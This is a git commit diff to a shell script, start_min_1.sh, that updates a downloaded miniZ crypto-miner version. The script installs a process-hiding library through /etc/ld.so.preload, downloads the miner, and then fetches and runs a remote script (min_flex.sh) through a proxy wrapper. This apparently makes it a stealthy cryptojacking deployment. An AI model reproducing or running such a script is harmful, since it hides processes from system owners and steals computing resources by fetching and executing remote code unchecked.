7e045da537c3e106100240cc205fab37e8452be1
17mei2022 <105721082+17mei2022@users.noreply.github.com>
2022-05-19 02:34:19 +0700

    Update start_min_1.sh

--- start_min_1.sh
+++ start_min_1.sh
@@ -5,10 +5,10 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8z2/miniZ_v1.8z2_linux-x64.tar.gz
-tar -xvzf miniZ_v1.8z2_linux-x64.tar.gz
+wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
+tar -xvzf miniZ_v1.8y3_linux-x64.tar.gz
 rm .gitignore
-cd 1.8z2
+cd 1.1.8y3
 wget https://raw.githubusercontent.com/17mei2022/today/main/min_flex.sh
 chmod +x *.sh
 graftcp ./min_flex.sh
